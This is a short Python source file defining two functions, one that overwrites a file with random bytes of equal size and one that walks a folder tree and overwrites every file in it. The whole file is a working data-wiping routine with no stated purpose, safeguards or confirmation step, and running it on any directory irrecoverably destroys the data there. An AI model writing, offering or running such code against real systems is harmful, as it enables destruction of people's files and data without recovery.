import os

def corrupt_file(file_path):
    file_size = os.path.getsize(file_path)

    with open(file_path, 'wb') as f:
        f.write(os.urandom(file_size))

def corrupt_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            corrupt_file(file_path)
